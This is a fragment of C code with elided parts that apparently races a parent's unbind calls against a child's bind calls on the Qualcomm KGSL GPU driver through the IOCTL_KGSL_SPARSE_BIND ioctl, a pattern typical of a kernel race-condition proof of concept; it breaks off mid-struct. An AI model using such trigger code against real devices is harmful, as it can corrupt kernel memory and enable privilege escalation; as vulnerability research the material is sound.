...
int main() {
    ...
    if (pid) {
        for (int i = 0; i < 1000000; i++) {
            ...
            printf("bind ret %d %d\n", ret, errno);
            struct kgsl_sparse_binding_object unbind_obj = {
                .virtoffset = 0,
                .physoffset = 0,
                .size = 0x1000,
                .flags = KGSL_SPARSE_UNBIND,
                .id = valloc_arg.id,
            };
            struct kgsl_sparse_bind unbind_arg = {
                .list = (uintptr_t)&unbind_obj, 
                .id = valloc_arg.id,
                .size = sizeof(struct kgsl_sparse_binding_object),
                .count = 1,
            };
            ret = ioctl(kgsl_fd, IOCTL_KGSL_SPARSE_BIND, &unbind_arg);
            printf("unbind ret %d %d\n", ret, errno);
        }
    } else {
        for (int i = 0; i < 1000000; i++) {
            struct kgsl_sparse_binding_object bind_obj = {
